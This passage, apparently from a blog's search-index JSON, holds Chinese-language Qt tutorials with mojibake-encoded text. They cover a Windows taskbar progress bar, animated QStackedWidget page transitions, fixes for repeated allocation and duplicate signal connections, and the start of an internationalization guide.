1pScaleAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad);","tags":[{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘ä»»åŠ¡æ æ˜¾ç¤ºè¿›åº¦æ¡","date":"2023-10-27T01:24:02.324Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘ä»»åŠ¡æ è¿›åº¦æ¡/","text":"Qt ä»»åŠ¡æ æ˜¾ç¤ºè¿›åº¦æ¡ æ³¨æ„äº‹é¡¹ï¼š ä¿®æ”¹proæ–‡ä»¶ ç•Œé¢å±•ç¤ºåå† new QWinTaskbarButtonï¼Œå¦åˆ™ä¼šä¸æ˜¾ç¤º # Qt å®˜æ–¹demo 1234567QWinTaskbarButton *button = new QWinTaskbarButton(widget);button-&gt;setWindow(widget-&gt;windowHandle());button-&gt;setOverlayIcon(QIcon(&quot;:/loading.png&quot;));QWinTaskbarProgress *progress = button-&gt;progress();progress-&gt;setVisible(true);progress-&gt;setValue(50); # Demo 1 ä¿®æ”¹proæ–‡ä»¶ 1win32:QT += winextras 2 .h 12345678910111213141516171819202122232425262728293031323334353637#ifndef TASKBARPROGRESS_H#define TASKBARPROGRESS_H #include &lt;QMainWindow&gt;#include &lt;QTimer&gt;#include &lt;QAbstractButton&gt;#include &lt;QWinTaskbarProgress&gt;#include &lt;QWinTaskbarButton&gt; namespace Ui &#123;class TaskbarProgress;&#125; class TaskbarProgress : public QMainWindow&#123; Q_OBJECT public: explicit TaskbarProgress(QWidget *parent = 0); ~TaskbarProgress(); void onButtonClicked(); void onTimeout(); private: Ui::TaskbarProgress *ui; QTimer *timer; QWinTaskbarButton *windowsTaskbarButton; QWinTaskbarProgress *windowsTaskbarProgress;&#125;; #endif // TASKBARPROGRESS_H 3 .cpp 12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;taskbarprogress.h&quot;#include &quot;ui_taskbarprogress.h&quot; TaskbarProgress::TaskbarProgress(QWidget *parent) : QMainWindow(parent), ui(new Ui::TaskbarProgress)&#123; ui-&gt;setupUi(this); timer = new QTimer; timer-&gt;setInterval(1000); //è®¾ç½®æ—¶é—´é—´éš” //åˆ›å»ºæ˜¾ç¤ºè¿›åº¦çš„ä»»åŠ¡æ æŒ‰é’® windowsTaskbarButton = new QWinTaskbarButton(this); connect(timer, &amp;QTimer::timeout, this, &amp;TaskbarProgress::onTimeout); connect(ui-&gt;Btn_Start, &amp;QAbstractButton::clicked, this, &amp;TaskbarProgress::onButtonClicked);&#125; TaskbarProgress::~TaskbarProgress()&#123; delete ui;&#125; void TaskbarProgress::onButtonClicked() &#123; //å°†ä»»åŠ¡æ æŒ‰é’®å…³è”åˆ°è¿›åº¦æ ï¼Œå‡è®¾è¿›åº¦æ æ˜¯å®ƒè‡ªå·±çš„çª—å£ windowsTaskbarButton-&gt;setWindow(windowHandle()); windowsTaskbarProgress = windowsTaskbarButton-&gt;progress(); windowsTaskbarProgress-&gt;setRange(0, 100); timer-&gt;start();&#125; void TaskbarProgress::onTimeout() &#123; //å½“è¿›åº¦æ¡çš„å€¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ›´æ”¹ä»»åŠ¡æ ä¸­çš„è¿›åº¦å€¼ windowsTaskbarProgress-&gt;setValue(windowsTaskbarProgress-&gt;value() + 20); windowsTaskbarProgress-&gt;show(); if (windowsTaskbarProgress-&gt;value() &gt; 99) &#123; windowsTaskbarProgress-&gt;setValue(0); timer-&gt;stop(); &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"},{"name":"Windows/ä»»åŠ¡æ ","slug":"Windows-ä»»åŠ¡æ ","permalink":"https://hodlyounger.github.io/tags/Windows-%E4%BB%BB%E5%8A%A1%E6%A0%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘QStackWidgetåŠ¨ç”»(2)","date":"2023-10-27T01:24:02.323Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘QStackWidgetåŠ¨ç”»2/","text":"QStackWidget åˆ‡æ¢åŠ¨ç”»çš„å®ç°æ–¹å¼ï¼Œé€šè¿‡é‡å†™ QWidget å®ç° ä½¿ç”¨é‡å†™å®ç°çš„åˆ‡æ¢åŠ¨ç”»ä½¿ç”¨å’Œå±•ç¤ºä¸Šæ›´ç¨³å®šï¼Œæ¨èä½¿ç”¨å½“å‰è¿™ä¸ªã€‚ .h æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#ifndef MYSTACKWIDGET_H#define MYSTACKWIDGET_H#include &lt;QPropertyAnimation&gt;class MyStackWidget : public QWidget&#123; Q_OBJECTpublic: MyStackWidget(QWidget *parent); ~MyStackWidget(); int addWidget(QWidget *widget); //æ·»åŠ æ§ä»¶ int insertWidget(int index, QWidget *widget); //æ’å…¥æ§ä»¶ void removeWidget(QWidget *widget); //åˆ é™¤æ§ä»¶ int count() const; //ç›®å‰æ§ä»¶æ•° void setWidgetsVisible(); //è®¾ç½®æ§ä»¶å¯è§ void setCurrentWidget(QWidget *widget); //è®¾ç½®å½“å‰widgetæ˜¾ç¤º void setCurrentIndex(int index); int currentIndex() const; //è·å–å½“å‰æ˜¾ç¤ºä½ç½® QWidget *currentWidget() const; //è·å–å½“å‰æ˜¾ç¤ºçš„æ§ä»¶ QWidget *widget(int index) const; int indexOf(QWidget *widget) const; //è·å–widgetæ‰€åœ¨ä½ç½® void setDuration(int duration); //è®¾ç½®åŠ¨ç”»æ—¶é•¿protected: void resizeEvent(QResizeEvent *event);signals: void widgetRemoved(int); void currentChanged(int);private slots: void onValueChanged(const QVariant &amp;value);private: QList&lt;QWidget *&gt; m_widgetLst; //åŠ å…¥çš„æ§ä»¶é“¾è¡¨ QPropertyAnimation *m_moveAnimation; //åŠ¨ç”»ç±» int m_curIndex = 0; //å½“å‰æ˜¾ç¤ºä½ç½® int m_offset = 0; //éœ€è¦æ˜¾ç¤ºçš„ä½ç½®ä¸å½“å‰æ˜¾ç¤ºçš„ä½ç½®çš„åå·® int m_lastIndex = 0; //æœ€åä½ç½® int m_duration = 500; //åŠ¨ç”»æ˜¾ç¤ºæ—¶é•¿ï¼Œå•ä½:ms void moveAnimationStart(); //å¯åŠ¨ç§»åŠ¨åŠ¨ç”»&#125;;#endif // MYSTACKWIDGET_H .cpp æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165#include &quot;mystackwidget.h&quot;#include &lt;QDebug&gt;#include &lt;QPropertyAnimation&gt;MyStackWidget::MyStackWidget(QWidget *parent) : QWidget(parent)&#123; m_offset = 0; m_curIndex = 0; m_lastIndex = 0; m_duration = 500; m_moveAnimation = new QPropertyAnimation(this, &quot;&quot;); m_moveAnimation-&gt;setDuration(m_duration); connect(m_moveAnimation, &amp;QPropertyAnimation::valueChanged, this, &amp;MyStackWidget::onValueChanged);&#125;MyStackWidget::~MyStackWidget()&#123;&#125;int MyStackWidget::count() const&#123; return m_widgetLst.size();&#125;int MyStackWidget::currentIndex() const&#123; return m_curIndex;&#125;void MyStackWidget::setDuration(int duration)&#123; m_duration = duration;&#125;int MyStackWidget::addWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0)&#123; return index; &#125; widget-&gt;setParent(this); m_widgetLst.append(widget); return count() - 1;&#125;int MyStackWidget::indexOf(QWidget * widget) const&#123; return m_widgetLst.indexOf(widget);&#125;int MyStackWidget::insertWidget(int index, QWidget * widget)&#123; int curindex = indexOf(widget); if (curindex &gt;= 0) &#123; return curindex; &#125; widget-&gt;setParent(this); m_widgetLst.insert(index, widget); return index;&#125;QWidget * MyStackWidget::currentWidget() const&#123; if (m_curIndex &gt;= 0 &amp;&amp; m_curIndex &lt; count())&#123; return m_widgetLst.at(m_curIndex); &#125; return nullptr;&#125;QWidget * MyStackWidget::widget(int index) const&#123; if (index &gt;= 0 &amp;&amp; index &lt; count()) &#123; return m_widgetLst.at(index); &#125; return nullptr;&#125;void MyStackWidget::removeWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0) &#123; m_widgetLst.removeAll(widget); emit widgetRemoved(index); &#125;&#125;void MyStackWidget::setCurrentWidget(QWidget * widget)&#123; int index = indexOf(widget); if (index &gt;= 0 &amp;&amp; m_curIndex != index) &#123; setCurrentIndex(index); &#125;&#125;void MyStackWidget::setCurrentIndex(int index)&#123; if (index &gt;= 0 &amp;&amp; m_curIndex != index) &#123; m_lastIndex = m_curIndex; m_curIndex = index; moveAnimationStart(); emit currentChanged(index); &#125;&#125;void MyStackWidget::resizeEvent(QResizeEvent *event)&#123; QWidget::resizeEvent(event); int size = count(); for (int i = 0; i &lt; size; i++) &#123; m_widgetLst.at(i)-&gt;resize(this-&gt;width(), this-&gt;height()); &#125; if (m_moveAnimation-&gt;state() == QAbstractAnimation::Running) &#123; moveAnimationStart(); &#125; else &#123; setWidgetsVisible(); &#125;&#125;void MyStackWidget::onValueChanged(const QVariant &amp;value)&#123; m_offset = value.toInt(); m_widgetLst.at(m_curIndex)-&gt;move(m_offset, 0); if (m_curIndex &gt; m_lastIndex) &#123; m_widgetLst.at(m_lastIndex)-&gt;move(m_offset - this-&gt;width(), 0); &#125; else &#123; m_widgetLst.at(m_lastIndex)-&gt;move(this-&gt;width() + m_offset, 0); &#125;&#125;void MyStackWidget::moveAnimationStart()&#123; m_moveAnimation-&gt;stop(); setWidgetsVisible(); int startOffset = m_offset; if (m_curIndex &gt; m_lastIndex) &#123; if (startOffset == 0) startOffset = this-&gt;width(); else startOffset = this-&gt;width() - qAbs(startOffset); &#125; else &#123; if (startOffset == 0) startOffset = -this-&gt;width(); else startOffset = qAbs(startOffset) - this-&gt;width(); &#125; m_moveAnimation-&gt;setDuration(qAbs(startOffset) * m_duration / this-&gt;width()); m_moveAnimation-&gt;setStartValue(startOffset); m_moveAnimation-&gt;setEndValue(0); m_moveAnimation-&gt;start();&#125;void MyStackWidget::setWidgetsVisible()&#123; int size = count(); for (int i = 0; i &lt; size; i++) &#123; if (m_lastIndex == i || m_curIndex == i) m_widgetLst.at(i)-&gt;setVisible(true); else &#123; m_widgetLst.at(i)-&gt;setVisible(false); &#125; &#125;&#125;","tags":[{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"},{"name":"Qt/QStackWidget","slug":"Qt-QStackWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QStackWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘QStackWidgetåŠ¨ç”»ï¼ˆ1ï¼‰","date":"2023-10-27T01:24:02.322Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘QStackWidgetåŠ¨ç”»/","text":"ä½¿ç”¨ç›´æ¥æå‡ä¸ºç»„ä»¶ä¸ºå½“å‰ç»„ä»¶å³å¯ã€‚ .h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#ifndef QANIMATIONSTACKEDWIDGET_H#define QANIMATIONSTACKEDWIDGET_H#include &lt;QStackedWidget&gt;#include &lt;QVariant&gt;class QPropertyAnimation;class QGraphicsOpacityEffect;class QParallelAnimationGroup;//class QVariant;class QAnimationStackedWidget : public QStackedWidget&#123; Q_OBJECTpublic: explicit QAnimationStackedWidget(QWidget *parent = Q_NULLPTR); ~QAnimationStackedWidget(); void Next(); void SwitchToIndex(int NextIndex, bool bFront = true); void setCurrentWidget(QWidget* widget);protected: void paintEvent(QPaintEvent *e);private: QParallelAnimationGroup* m_ParlGroup; QPropertyAnimation *m_pAnimPrty; QGraphicsOpacityEffect* m_pAnimGraphicsEffect; QPropertyAnimation* m_pAnimGraphics; bool m_bAnimation; int m_nDuration; int m_nWidgetCount; int m_nNextIndex; QVariant m_nCurValue; bool m_bMoveFront;private: void Init(); void paintPrevious(QPainter &amp;paint, int currentIndex); void paintNext(QPainter &amp;paint, int nextIndex); void moveAnimationStart(bool bEnter);private slots: void slotAnimationValueChanged(QVariant value); void slotAnimationFinished();&#125;;#endif // QANIMATIONSTACKEDWIDGET_H .cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220#include &quot;QAnimationStackedWidget.h&quot;#include &lt;QPropertyAnimation&gt;#include &lt;QPainter&gt;#include &lt;QParallelAnimationGroup&gt;#include &lt;QGraphicsOpacityEffect&gt;QAnimationStackedWidget::QAnimationStackedWidget(QWidget *parent) : QStackedWidget(parent)&#123; Init();&#125;QAnimationStackedWidget::~QAnimationStackedWidget()&#123;&#125;void QAnimationStackedWidget::Init()&#123; m_bAnimation = false; m_nDuration = 350; m_ParlGroup = new QParallelAnimationGroup(); m_pAnimGraphicsEffect = new QGraphicsOpacityEffect(this); m_pAnimGraphicsEffect-&gt;setOpacity(1); this-&gt;setGraphicsEffect(m_pAnimGraphicsEffect); m_pAnimGraphics = new QPropertyAnimation(m_pAnimGraphicsEffect, &quot;opacity&quot;); m_pAnimPrty = new QPropertyAnimation(this, QByteArray()); connect(m_pAnimPrty, SIGNAL(valueChanged(QVariant)), this, SLOT(slotAnimationValueChanged(QVariant))); connect(m_pAnimPrty, SIGNAL(finished()), this, SLOT(slotAnimationFinished())); m_pAnimPrty-&gt;setEasingCurve(QEasingCurve::InOutQuad); m_pAnimGraphics-&gt;setEasingCurve(QEasingCurve::InOutQuad); m_ParlGroup-&gt;addAnimation(m_pAnimPrty); m_ParlGroup-&gt;addAnimation(m_pAnimGraphics);&#125;void QAnimationStackedWidget::slotAnimationValueChanged(QVariant value)&#123; m_nCurValue = value; update();&#125;void QAnimationStackedWidget::slotAnimationFinished()&#123; m_bAnimation = false; widget(currentIndex())-&gt;show(); setCurrentIndex(m_nNextIndex);&#125;void QAnimationStackedWidget::paintEvent(QPaintEvent *e)&#123; Q_UNUSED(e) if(m_bAnimation) &#123; QPainter paint(this); if (m_bMoveFront) &#123; //ç»˜åˆ¶å½“å‰Widget paintPrevious(paint, currentIndex()); //ç»˜åˆ¶ä¸‹ä¸€ä¸ªwidget paintNext(paint, m_nNextIndex); &#125; else &#123; //ç»˜åˆ¶å½“å‰Widget paintPrevious(paint, m_nNextIndex); //ç»˜åˆ¶ä¸‹ä¸€ä¸ªwidget paintNext(paint, currentIndex()); &#125; &#125;&#125;void QAnimationStackedWidget::paintPrevious(QPainter &amp;paint, int currentIndex)&#123; //è·å¾—å½“å‰é¡µé¢çš„Widget QWidget *w = widget(currentIndex); // åˆ‡æ¢è¿‡ç¨‹çª—å£çš„èƒŒæ™¯è‰² QString strStyle = QString(&quot;#%1&#123;background-color: #FFFFFF&#125;&quot;).arg(w-&gt;objectName()); w-&gt;setStyleSheet(strStyle); QPixmap pixmap(w-&gt;size()); //å°†Widgetçš„å†…å®¹æ¸²æŸ“åˆ°QPixmapå¯¹è±¡ä¸­ï¼Œå³å°†Widgetå˜æˆä¸€å¼ å›¾ç‰‡ w-&gt;render(&amp;pixmap); QRect r = w-&gt;geometry(); //ç»˜åˆ¶å½“å‰çš„Widget double value = m_nCurValue.toDouble(); QRectF r1(0.0, 0.0, value, r.height()); QRectF r2(r.width() - value, 0, value, r.height()); paint.drawPixmap(r1, pixmap, r2);&#125;void QAnimationStackedWidget::paintNext(QPainter &amp;paint, int nextIndex)&#123; QWidget *nextWidget = widget(nextIndex); QString strStyle = QString(&quot;#%1&#123;background-color: #FFFFFF&#125;&quot;).arg(nextWidget-&gt;objectName()); nextWidget-&gt;setStyleSheet(strStyle); QRect r = geometry(); //è¿™è¡Œä»£ç ä¸åŠ ä¼šæœ‰bugï¼Œç¬¬ä¸€æ¬¡åˆ‡æ¢çš„æ—¶å€™ï¼ŒQStackedWidgetå¹¶æ²¡æœ‰ä¸ºchildåˆ†é…å¤§å° nextWidget-&gt;resize(r.width(), r.height()); QPixmap nextPixmap(nextWidget-&gt;size()); nextWidget-&gt;render(&amp;nextPixmap); double value = m_nCurValue.toDouble(); QRectF r1(value, 0.0, r.width() - value, r.height()); QRectF r2(0.0, 0.0, r.width() - value, r.height()); paint.drawPixmap(r1, nextPixmap, r2);&#125;void QAnimationStackedWidget::moveAnimationStart(bool bEnter)&#123; if (bEnter) &#123; m_pAnimPrty-&gt;setStartValue(this-&gt;width()); m_pAnimPrty-&gt;setEndValue(0); m_pAnimGraphics-&gt;setDuration(m_nDuration); m_pAnimGraphics-&gt;setStartValue(0); m_pAnimGraphics-&gt;setEndValue(1); &#125; else &#123; m_pAnimPrty-&gt;setStartValue(0); m_pAnimPrty-&gt;setEndValue(this-&gt;width()); m_pAnimGraphics-&gt;setDuration(m_nDuration); m_pAnimGraphics-&gt;setStartValue(0); m_pAnimGraphics-&gt;setEndValue(1); &#125; m_pAnimPrty-&gt;setDuration(m_nDuration); // m_pAnimPrty-&gt;start(); m_ParlGroup-&gt;start();&#125;void QAnimationStackedWidget::SwitchToIndex(int index, bool bFront)&#123; //å¦‚æœæ­£åœ¨åŠ¨ç”»ï¼Œé‚£ä¹ˆreturn int curIndex = currentIndex(); m_bMoveFront = bFront; m_bAnimation = true; m_nWidgetCount = count(); m_nNextIndex = index; //éšè—å½“å‰çš„widget widget(curIndex)-&gt;hide(); //å¼€å§‹åŠ¨ç”»å¹¶è®¾ç½®é—´éš”å’Œå¼€å§‹ã€ç»“æŸå€¼ QRect g = geometry(); int width = g.width(); bFront = index &gt;= curIndex; moveAnimationStart(bFront);&#125;void QAnimationStackedWidget::setCurrentWidget(QWidget* widget)&#123; int index = indexOf(widget); SwitchToIndex(index);&#125;void QAnimationStackedWidget::Next()&#123; //å¦‚æœæ­£åœ¨åŠ¨ç”»ï¼Œé‚£ä¹ˆreturn if(m_bAnimation) &#123; return; &#125; m_bAnimation = true; m_nWidgetCount = count(); int nIndex = currentIndex(); //è®¡ç®—ä¸‹ä¸€é¡µçš„ç´¢å¼• m_nNextIndex = (nIndex + 1) % m_nWidgetCount; //éšè—å½“å‰çš„widget widget(nIndex)-&gt;hide(); //å¼€å§‹åŠ¨ç”»å¹¶è®¾ç½®é—´éš”å’Œå¼€å§‹ã€ç»“æŸå€¼ QRect g = geometry(); int x = g.x(); int width = g.width(); m_pAnimPrty-&gt;setStartValue(width); m_pAnimPrty-&gt;setEndValue(0); m_pAnimPrty-&gt;setDuration(m_nDuration); m_pAnimPrty-&gt;start(); Q_UNUSED(x)&#125;","tags":[{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"},{"name":"Qt/QStackWidget","slug":"Qt-QStackWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QStackWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘å› ä¸ºæ§½å‡½æ•°é—®é¢˜æˆ–è€…é€»è¾‘é—®é¢˜å¯¼è‡´é‡å¤newé—®é¢˜è§£å†³åŠæ³•åŠå»ºè®®","date":"2023-10-27T01:24:02.321Z","path":"B_Code/Qt/å†…å­˜/ã€Qtã€‘é‡å¤newé—®é¢˜/","text":"[toc] æ§½å‡½æ•°ä¸­é‡å¤ new è¿™ä¸ªé—®é¢˜æ¯”éª„å¸¸è§ï¼Œä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š 12345678connect(timer, &amp;QTimer::timeout, this, &amp;this::slotCreateItem);void slotCreateItem()&#123; QWidget *widget = new QWidget();&#125;timer-&gt;start(1000); ä¸Šè¾¹åªæ˜¯ä¸ºäº†è¯´æ˜ä¸€ä¸‹ç±»ä¼¼çš„è¿™ç§æƒ…å†µï¼Œç”±äºä¸€äº›ç‰¹æ®ŠåŸå› å¯¼è‡´çš„æ§½å‡½æ•°ä¸­ä¼šå¤šæ¬¡è§¦å‘ new æ“ä½œã€‚ è§£å†³åŠæ³• è®¾ç½®ä¸ºæˆå‘˜å˜é‡ï¼Œåœ¨è¿›å…¥å‡½æ•°æ—¶ï¼Œå…ˆæ‰§è¡Œ delete ï¼Œå†å» new 123456789void slotCreateItem()&#123; if(nullptr == m_widget) &#123; delete m_widget; m_widget = nullptr; &#125; m_widget = new QWidget();&#125; ç¬¬äºŒç§åŠæ³•å°±æ˜¯è®¾ç½®æ§ä»¶å±æ€§ 12345void slotCreateItem()&#123; QWidget *widget = new QWidget(); widget-&gt;setAttribute(WA_DeleteOnClose);&#125; æ§½å‡½æ•°å¤šæ¬¡ç»‘å®šé—®é¢˜ 123456connect(timer, &amp;QTimer::timeout, this, &amp;this::slotCreateItem);void slotCreateItem()&#123; connect(timer, &amp;QTimer::timeout, this, &amp;this::slotRePaint); // æ¯è¿›å…¥ä¸€æ¬¡å°±ä¼šç»‘å®šä¸€æ¬¡ï¼Œæ¯ç»‘å®šä¸€æ¬¡ï¼Œè§¦å‘æ¬¡æ•°å°±ä¼šå¢åŠ ä¸€æ¬¡&#125; è§£å†³åŠæ³• ä½¿ç”¨ Qt çš„ç¬¬äº”ä¸ªå‚æ•°æ§åˆ¶ã€‚å°†ä¸Šè¿°ä»£ç æ”¹ä¸ºä»¥ä¸‹å½¢å¼ 1connect(timer, &amp;QTimer::timeout, this, &amp;this::slotRePaint, Qt::UniqueConnection); // ï¼ˆmodifyï¼‰æ¯è¿›å…¥ä¸€æ¬¡å°±ä¼šç»‘å®šä¸€æ¬¡ï¼Œæ¯ç»‘å®šä¸€æ¬¡ï¼Œè§¦å‘æ¬¡æ•°å°±ä¼šå¢åŠ ä¸€æ¬¡ Qt::UniqueConnectionï¼šè¿™æ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œå¯ä»¥ä½¿ç”¨ä½æˆ–ä¸ä¸Šè¿°ä»»ä½•ä¸€ç§è¿æ¥ç±»å‹ç»“åˆä½¿ç”¨ã€‚å½“ Qt::UniqueConnection è¢«è®¾ç½®åï¼Œå¦‚æœè¿æ¥å·²ç»å­˜åœ¨ï¼ŒQObject::connect() å°†ä¼šå¤±è´¥(å³ï¼Œå¦‚æœç›¸åŒçš„ä¿¡å·å·²ç»ä¸ºåŒä¸€å¯¹å¯¹è±¡è¿æ¥åˆ°ç›¸åŒçš„æ§½ä½)ã€‚è¿™ä¸ªæ ‡å¿—æ˜¯åœ¨Qt 4.6ä¸­å¼•å…¥çš„ã€‚ ä»¥ä¸‹ä¸º Qt ç¬¬äº”ä¸ªå‚æ•°å„ä¸ªå«ä¹‰ï¼š å¸¸é‡ å€¼ æè¿° Qt::AutoConnection 0 (é»˜è®¤)å¦‚æœæ¥æ”¶å™¨ä½äºå‘å‡ºä¿¡å·çš„çº¿ç¨‹ä¸­ï¼Œåˆ™ä½¿ç”¨Qt::DirectConnectionã€‚å¦åˆ™ï¼Œä½¿ç”¨Qt::QueuedConnectionã€‚è¿æ¥ç±»å‹æ˜¯åœ¨ä¿¡å·å‘å‡ºæ—¶ç¡®å®šçš„ã€‚ Qt::DirectConnection 1 å‘å‡ºä¿¡å·æ—¶ç«‹å³è°ƒç”¨æ’æ§½ã€‚æ§½åœ¨ä¿¡ä»¤çº¿ç¨‹ä¸­æ‰§è¡Œã€‚ Qt::QueuedConnection 2 å½“æ§åˆ¶è¿”å›åˆ°æ¥æ”¶æ–¹çº¿ç¨‹çš„äº‹ä»¶å¾ªç¯æ—¶ï¼Œå°†è°ƒç”¨æ’æ§½ã€‚æ’æ§½åœ¨æ¥æ”¶æ–¹çš„çº¿ç¨‹ä¸­æ‰§è¡Œã€‚ Qt::BlockingQueuedConnection 3 ä¸Qt::QueuedConnectionç›¸åŒï¼Œé™¤äº†ä¿¡ä»¤çº¿ç¨‹é˜»å¡ç›´åˆ°æ’æ§½è¿”å›ã€‚å¦‚æœæ¥æ”¶ç«¯ä½äºä¿¡ä»¤çº¿ç¨‹ä¸­ï¼Œåˆ™ç»ä¸èƒ½ä½¿ç”¨æ­¤è¿æ¥ï¼Œå¦åˆ™åº”ç”¨ç¨‹åºå°†æ­»é”ã€‚ Qt::UniqueConnection 0x80 è¿™æ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œå¯ä»¥ä½¿ç”¨ä½æˆ–ä¸ä¸Šè¿°ä»»ä½•ä¸€ç§è¿æ¥ç±»å‹ç»“åˆä½¿ç”¨ã€‚å½“Qt::UniqueConnectionè¢«è®¾ç½®åï¼Œå¦‚æœè¿æ¥å·²ç»å­˜åœ¨ï¼ŒQObject::connect()å°†ä¼šå¤±è´¥","tags":[{"name":"å†…å­˜","slug":"å†…å­˜","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"new","slug":"new","permalink":"https://hodlyounger.github.io/tags/new/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"å†…å­˜","slug":"B-Code/Qt/å†…å­˜","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%86%85%E5%AD%98/"}]},{"title":"ã€Qtã€‘å›½é™…åŒ–","date":"2023-10-27T01:24:02.319Z","path":"B_Code/Qt/ã€Qtã€‘ä¸­è‹±æ–‡åˆ‡æ¢/","text":"æ¦‚è¿°ï¼šæ”¯æŒå›½é™…åŒ–æ˜¯è½¯ä»¶å‘å¸ƒçš„åŸºæœ¬é¡¹ã€‚ç°é˜¶æ®µæˆ‘æ‰€åœ¨çš„é¡¹ç›®ä¹Ÿæ˜¯æœ‰äº†è¿™ä¸€éœ€æ±‚ï¼ŒåŸºäºQtå®ç°è¿™ä¸€éœ€æ±‚ä¹Ÿç›¸å¯¹æ¯”è¾ƒç®€å•ã€‚ [toc] # Qtæ”¯æŒå›½é™…åŒ– Qtå®‰è£…æ—¶ï¼Œå¸¦äº†ä¸€ä¸ª Qt Linguist çš„è½¯ä»¶ï¼Œè¿™ä¸ªè½¯ä»¶å°±æ˜¯ Qt ç”¨æ¥å®ç°è½¯ä»¶ç¿»è¯‘çš„å·¥å…·ã€‚åœ¨ Qt ä¸­ï¼Œæ‰€æœ‰çš„è¾“å…¥ä¸è§å’Œæ–‡æœ¬ç»˜åˆ¶æ–¹å¼å¯¹Qtæ”¯æŒçš„æ‰€æœ‰è¯­è¨€éƒ½æä¾›äº†å†…ç½®çš„æ”¯æŒã€‚Qtå†…ç½®çš„å­—ä½“å¼•æ“å¯ä»¥åœ¨åŒä¸€æ—¶é—´æ­£ç¡®è€Œä¸”ç²¾ç¡®åœ°ç»˜åˆ¶ä¸åŒçš„æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å¯ä»¥åŒ…å«æ¥è‡ªä¼—å¤šä¸åŒä¹¦å†™ç³»ç»Ÿçš„å­—ç¬¦ã€‚ # ä½¿ç”¨ Qt Linguist ç¿»è¯‘å·¥å…· tr()å‡½æ•° åœ¨Qtä¸­ç¼–å†™ä»£ç æ—¶è¦å¯¹éœ€è¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²è°ƒç”¨ tr() å‡½æ•°ï¼Œå®Œæˆä»£ç ç¼–å†™åå¯¹è¿™ä¸ªåº”ç”¨ç¨‹åºçš„ç¿»è¯‘ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š ä½¿ç”¨tr()å‡½æ•° -&gt; ä¿®æ”¹proæ–‡ä»¶ -&gt; æ›´æ–°è¯­è¨€æ–‡ä»¶ -&gt; å‘å¸ƒè¯­è¨€æ–‡ä»¶ -&gt; 